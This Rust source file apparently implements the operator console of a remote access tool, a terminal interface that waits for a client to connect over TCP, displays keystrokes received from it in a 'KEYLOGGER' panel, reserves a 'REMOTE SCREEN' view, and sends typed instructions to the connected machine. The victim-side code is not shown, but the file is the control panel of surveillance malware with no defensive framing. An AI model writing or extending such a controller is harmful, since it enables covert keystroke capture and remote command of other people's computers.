use std::net::{TcpStream, SocketAddr};

use color_eyre::Result;
use crossterm::event::{KeyCode, KeyEvent};
use ratatui::layout::{Constraint, Layout, Rect};
use ratatui::text::{Line, Span};
use ratatui::style::{Color, Style, Modifier};
use ratatui::widgets::{Block, Borders, List, ListItem, Paragraph, Tabs};
use ratatui::{DefaultTerminal, Frame};

use super::Core;

pub enum AppEvent {
    Keylogger(String),
    Terminal(KeyEvent),
    ClientConnected(TcpStream, SocketAddr),
}

pub struct TabsState<'a> {
    pub titles: Vec<&'a str>,
    pub index: usize,
}

impl<'a> TabsState<'a> {
    pub const fn new(titles: Vec<&'a str>) -> Self {
        Self { titles, index: 0 }
    }
    pub fn next(&mut self) {
        self.index = (self.index + 1) % self.titles.len();
    }

    pub fn previous(&mut self) {
        if self.index > 0 {
            self.index -= 1;
        } else {
            self.index = self.titles.len() - 1;
        }
    }
}

pub struct App<'a> {
    title: &'a str,
    input: String,
    tabs: TabsState<'a>,
    character_index: usize,
    messages: Vec<String>,
    instructions: Vec<String>,
    client_addr: String,
    logged_keys: String,
    core: Core,
}

impl<'a> App<'a> {
    pub fn new(title: &'a str) -> Self {
        Self {
            title,
            input: String::new(),
            tabs: TabsState::new(vec!["Client", "View", "Input"]),
            messages: Vec::new(),
            instructions: Vec::new(),
            character_index: 0,
            client_addr: String::new(),
            logged_keys: String::new(),
            core: Core::new(),
        }
    }

    fn on_right(&mut self) {
        self.tabs.next();
    }

    fn on_left(&mut self) {
        self.tabs.previous();
    }

    fn move_cursor_left(&mut self) {
        let cursor_moved_left = self.character_index.saturating_sub(1);
        self.character_index = self.clamp_cursor(cursor_moved_left);
    }

    fn move_cursor_right(&mut self) {
        let cursor_moved_right = self.character_index.saturating_add(1);
        self.character_index = self.clamp_cursor(cursor_moved_right);
    }

    fn enter_char(&mut self, new_char: char) {
        let index = self.byte_index();
        self.input.insert(index, new_char);
        self.move_cursor_right();
    }

    fn byte_index(&self) -> usize {
        self.input
            .char_indices()
            .map(|(i, _)| i)
            .nth(self.character_index)
            .unwrap_or(self.input.len())
    }

    fn delete_char(&mut self) {
        let is_not_cursor_leftmost = self.character_index != 0;
        if is_not_cursor_leftmost {
            let current_index = self.character_index;
            let from_left_to_current_index = current_index - 1;

            let before_char_to_delete = self.input.chars().take(from_left_to_current_index);
            let after_char_to_delete = self.input.chars().skip(current_index);

            self.input = before_char_to_delete.chain(after_char_to_delete).collect();
            self.move_cursor_left();
        }
    }

    fn clamp_cursor(&self, new_cursor_pos: usize) -> usize {
        new_cursor_pos.clamp(0, self.input.chars().count())
    }

    const fn reset_cursor(&mut self) {
        self.character_index = 0;
    }

    fn submit_instructions(&mut self) {
        self.core.apply_instructions(self.input.clone()).unwrap();
        self.instructions.push(self.input.clone());
        self.input.clear();
        self.reset_cursor();
    }

    pub fn run(&mut self, terminal: &mut DefaultTerminal) -> Result<()> {
        terminal.draw(|frame| self.render(frame))?;

        self.core.start_tcp_listener();
        self.core.start_terminal_key_events();

        while let Ok(event) = self.core.receiver.recv() {
            match event {
                AppEvent::ClientConnected(stream, addr) => {
                    self.client_addr = addr.to_string();

                    let mut stream_guard = self.core.stream.lock().unwrap();
                    *stream_guard = Some(stream);           
                },
                AppEvent::Terminal(key) => {
                    match key.code {
                        KeyCode::Enter => self.submit_instructions(),
                        KeyCode::Char(to_insert) => self.enter_char(to_insert),
                        KeyCode::Backspace => self.delete_char(),
                        KeyCode::Left => self.move_cursor_left(),
                        KeyCode::Right => self.move_cursor_right(),
                        KeyCode::Tab => self.on_right(),
                        KeyCode::BackTab => self.on_left(),
                        KeyCode::Esc => break,
                        _ => {}
                    }
                }
                AppEvent::Keylogger(key) => {
                    self.logged_keys.push_str(&key);
                },
            }

            self.core.start_client_reader(); 
            terminal.draw(|frame| self.render(frame))?;
        };
        Ok(())
    }

    fn render(&mut self, frame: &mut Frame) {
        let bg = Block::default().style(Style::default().bg(Color::Rgb(10, 10, 18)));
        frame.render_widget(bg, frame.area());

        let chunks = Layout::vertical([
            Constraint::Length(3),
            Constraint::Min(0),    
            Constraint::Length(1), 
        ])
        .split(frame.area());

        let tab_titles: Vec<Line> = self
            .tabs
            .titles
            .iter()
            .enumerate()
            .map(|(i, t)| {
                if i == self.tabs.index {
                    Line::from(vec![
                        Span::raw(" "),
                        Span::styled(*t, Style::default()
                            .fg(Color::Rgb(0, 255, 200))
                            .add_modifier(Modifier::BOLD)),
                        Span::raw(" "),
                    ])
                } else {
                    Line::from(vec![
                        Span::raw(" "),
                        Span::styled(*t, Style::default().fg(Color::Rgb(100, 100, 130))),
                        Span::raw(" "),
                    ])
                }
            })
            .collect();

        let tabs = Tabs::new(tab_titles)
            .block(
                Block::default()
                    .borders(Borders::ALL)
                    .border_style(Style::default().fg(Color::Rgb(40, 40, 70)))
                    .title(Span::styled(
                        self.title,
                        Style::default()
                            .fg(Color::Rgb(0, 255, 200))
                            .add_modifier(Modifier::BOLD),
                    ))
                    .title_alignment(ratatui::layout::Alignment::Left)
                    .style(Style::default().bg(Color::Rgb(10, 10, 18))),
            )
            .highlight_style(
                Style::default()
                    .fg(Color::Rgb(0, 255, 200))
                    .bg(Color::Rgb(0, 40, 35))
                    .add_modifier(Modifier::BOLD),
            )
            .select(self.tabs.index)
            .divider(Span::styled("│", Style::default().fg(Color::Rgb(40, 40, 70))));

        frame.render_widget(tabs, chunks[0]);

        match self.tabs.index {
            0 => self.draw_first_tab(frame, chunks[1]),
            1 => self.draw_second_tab(frame, chunks[1]),
            2 => self.draw_third_tab(frame, chunks[1]),
            _ => {}
        }

        let status = Paragraph::new(Line::from(vec![
            Span::styled(" ESC", Style::default().fg(Color::Rgb(0, 255, 200)).add_modifier(Modifier::BOLD)),
            Span::styled(" quit  ", Style::default().fg(Color::Rgb(80, 80, 110))),
            Span::styled("TAB", Style::default().fg(Color::Rgb(0, 255, 200)).add_modifier(Modifier::BOLD)),
            Span::styled(" next tab  ", Style::default().fg(Color::Rgb(80, 80, 110))),
            Span::styled("ENTER", Style::default().fg(Color::Rgb(0, 255, 200)).add_modifier(Modifier::BOLD)),
            Span::styled(" send instruction", Style::default().fg(Color::Rgb(80, 80, 110))),
        ]))
        .style(Style::default().bg(Color::Rgb(14, 14, 24)));
        frame.render_widget(status, chunks[2]);
    }

    fn draw_first_tab(&mut self, frame: &mut Frame, area: Rect) {
        let chunks = Layout::vertical([
            Constraint::Length(4),
            Constraint::Length(1), 
            Constraint::Fill(13),
        ])
        .split(area);

        let client_block = Block::default()
            .borders(Borders::ALL)
            .border_style(Style::default().fg(Color::Rgb(40, 40, 70)))
            .title(Span::styled(
                " ▸ CLIENT ",
                Style::default()
                    .fg(Color::Rgb(0, 200, 160))
                    .add_modifier(Modifier::BOLD),
            ))
            .style(Style::default().bg(Color::Rgb(10, 10, 18)));

        let client_lines = if !self.client_addr.is_empty() {
            vec![
                Line::from(Span::raw(" ")),
                Line::from(vec![
                    Span::styled("  client connected from   ", Style::default()
                        .fg(Color::Rgb(50, 50, 80))),
                    Span::styled(&self.client_addr, Style::default().fg(Color::Rgb(40, 40, 65))),
                ]),
            ]
        } else {
            vec![
                Line::from(Span::raw(" ")),
                Line::from(vec![
                    Span::raw("  "),
                    Span::styled(
                        "  waiting for client ...  ",
                        Style::default().fg(Color::Rgb(40, 40, 65)),
                    ),
                ]),
            ]
        };

        let client = Paragraph::new(client_lines)
            .block(client_block)
            .style(Style::default().bg(Color::Rgb(10, 10, 18)));

        frame.render_widget(client, chunks[0]);

        let sep = Paragraph::new(Line::from(Span::styled(
            "─".repeat(area.width as usize),
            Style::default().fg(Color::Rgb(30, 30, 55)),
        )));
        frame.render_widget(sep, chunks[1]);

        let block = Block::default()
            .borders(Borders::ALL)
            .border_style(Style::default().fg(Color::Rgb(40, 40, 70)))
            .title(Span::styled(
                " ▸ EVENT LOG ",
                Style::default()
                    .fg(Color::Rgb(0, 200, 160))
                    .add_modifier(Modifier::BOLD),
            ))
            .style(Style::default().bg(Color::Rgb(10, 10, 18)));

        let messages: Vec<ListItem> = self
            .messages
            .iter()
            .enumerate()
            .map(|(i, m)| {
                let (_prefix_style, text_style) = if m.starts_with("[*]") {
                    (
                        Style::default().fg(Color::Rgb(0, 200, 160)).add_modifier(Modifier::BOLD),
                        Style::default().fg(Color::Rgb(180, 220, 210)),
                    )
                } else if m.starts_with("handled") {
                    (
                        Style::default().fg(Color::Rgb(180, 140, 255)).add_modifier(Modifier::BOLD),
                        Style::default().fg(Color::Rgb(190, 190, 220)),
                    )
                } else {
                    (
                        Style::default().fg(Color::Rgb(80, 80, 120)),
                        Style::default().fg(Color::Rgb(140, 140, 170)),
                    )
                };

                let line = Line::from(vec![
                    Span::styled(format!(" {:03} │ ", i + 1), Style::default().fg(Color::Rgb(40, 40, 70))),
                    Span::styled(m.as_str(), text_style),
                ]);
                ListItem::new(line)
            })
            .collect();

        let list = List::new(messages)
            .block(block)
            .highlight_style(Style::default().bg(Color::Rgb(20, 30, 40)));

        frame.render_widget(list, chunks[2]);
    }

    fn draw_second_tab(&mut self, frame: &mut Frame, area: Rect) {
        let chunks = Layout::vertical([
            Constraint::Fill(4),
            Constraint::Length(1), 
            Constraint::Fill(1),
        ])
        .split(area);

        let screen_block = Block::default()
            .borders(Borders::ALL)
            .border_style(Style::default().fg(Color::Rgb(40, 40, 70)))
            .title(Span::styled(
                " ▸ REMOTE SCREEN ",
                Style::default()
                    .fg(Color::Rgb(0, 200, 160))
                    .add_modifier(Modifier::BOLD),
            ))
            .style(Style::default().bg(Color::Rgb(10, 10, 18)));

        let placeholder_lines = vec![
            Line::from(""),
            Line::from(vec![
                Span::raw("  "),
                Span::styled(
                    "[ no screen capture available ]",
                    Style::default().fg(Color::Rgb(50, 50, 80)),
                ),
            ]),
            Line::from(vec![
                Span::raw("  "),
                Span::styled(
                    "waiting for stream...",
                    Style::default().fg(Color::Rgb(40, 40, 65)),
                ),
            ]),
        ];

        let user_screen = Paragraph::new(placeholder_lines)
            .block(screen_block)
            .style(Style::default().bg(Color::Rgb(10, 10, 18)));

        frame.render_widget(user_screen, chunks[0]);

        let sep = Paragraph::new(Line::from(Span::styled(
            "─".repeat(area.width as usize),
            Style::default().fg(Color::Rgb(30, 30, 55)),
        )));
        frame.render_widget(sep, chunks[1]);

        let key_display = if self.logged_keys.is_empty() {
            vec![Line::from(Span::styled(
                "  awaiting keystrokes...",
                Style::default().fg(Color::Rgb(50, 50, 80)),
            ))]
        } else {
            vec![Line::from(vec![
                Span::styled("  KEYS  ", Style::default()
                    .fg(Color::Rgb(0, 200, 160))
                    .add_modifier(Modifier::BOLD)),
                Span::styled(&self.logged_keys, Style::default().fg(Color::Rgb(220, 220, 240))),
            ])]
        };

        let keylogger_block = Block::default()
            .borders(Borders::ALL)
            .border_style(Style::default().fg(Color::Rgb(40, 40, 70)))
            .title(Span::styled(
                " ▸ KEYLOGGER ",
                Style::default()
                    .fg(Color::Rgb(0, 200, 160))
                    .add_modifier(Modifier::BOLD),
            ))
            .style(Style::default().bg(Color::Rgb(10, 10, 18)));

        let keylogger = Paragraph::new(key_display)
            .block(keylogger_block);
        frame.render_widget(keylogger, chunks[2]);
    }

    fn draw_third_tab(&mut self, frame: &mut Frame, area: Rect) {
        let chunks = Layout::vertical([
            Constraint::Length(3),  
            Constraint::Length(1),   
            Constraint::Fill(1),     
        ])
        .split(area);

        let before_cursor = &self.input[..self.byte_index()];
        let cursor_char = self.input.chars().nth(self.character_index).unwrap_or(' ');
        let after_cursor: String = self.input.chars().skip(self.character_index + 1).collect();

        let input_line = Line::from(vec![
            Span::styled("  ❯ ", Style::default()
                .fg(Color::Rgb(0, 255, 200))
                .add_modifier(Modifier::BOLD)),
            Span::styled(before_cursor, Style::default().fg(Color::Rgb(220, 220, 240))),
            Span::styled(
                cursor_char.to_string(),
                Style::default()
                    .fg(Color::Rgb(10, 10, 18))
                    .bg(Color::Rgb(0, 255, 200)),
            ),
            Span::styled(after_cursor, Style::default().fg(Color::Rgb(220, 220, 240))),
        ]);

        let input_block = Block::default()
            .borders(Borders::ALL)
            .border_style(Style::default().fg(Color::Rgb(0, 180, 140)))
            .title(Span::styled(
                " ▸ INSTRUCTION ",
                Style::default()
                    .fg(Color::Rgb(0, 255, 200))
                    .add_modifier(Modifier::BOLD),
            ))
            .style(Style::default().bg(Color::Rgb(10, 10, 18)));

        let input_widget = Paragraph::new(input_line).block(input_block);
        frame.render_widget(input_widget, chunks[0]);

        let sep = Paragraph::new(Line::from(Span::styled(
            "─".repeat(area.width as usize),
            Style::default().fg(Color::Rgb(30, 30, 55)),
        )));
        frame.render_widget(sep, chunks[1]);

        let history_block = Block::default()
            .borders(Borders::ALL)
            .border_style(Style::default().fg(Color::Rgb(40, 40, 70)))
            .title(Span::styled(
                " ▸ HISTORY ",
                Style::default()
                    .fg(Color::Rgb(0, 200, 160))
                    .add_modifier(Modifier::BOLD),
            ))
            .style(Style::default().bg(Color::Rgb(10, 10, 18)));

        let history: Vec<ListItem> = if self.instructions.is_empty() {
            vec![ListItem::new(Line::from(Span::styled(
                "  no instructions sent yet",
                Style::default().fg(Color::Rgb(50, 50, 80)),
            )))]
        } else {
            self.instructions
                .iter()
                .enumerate()
                .map(|(i, instr)| {
                    ListItem::new(Line::from(vec![
                        Span::styled(
                            format!("  #{} ", i + 1),
                            Style::default().fg(Color::Rgb(0, 180, 140)).add_modifier(Modifier::BOLD),
                        ),
                        Span::styled(instr.as_str(), Style::default().fg(Color::Rgb(200, 200, 230))),
                    ]))
                })
                .collect()
        };

        let history_list = List::new(history).block(history_block);
        frame.render_widget(history_list, chunks[2]);
    }
}
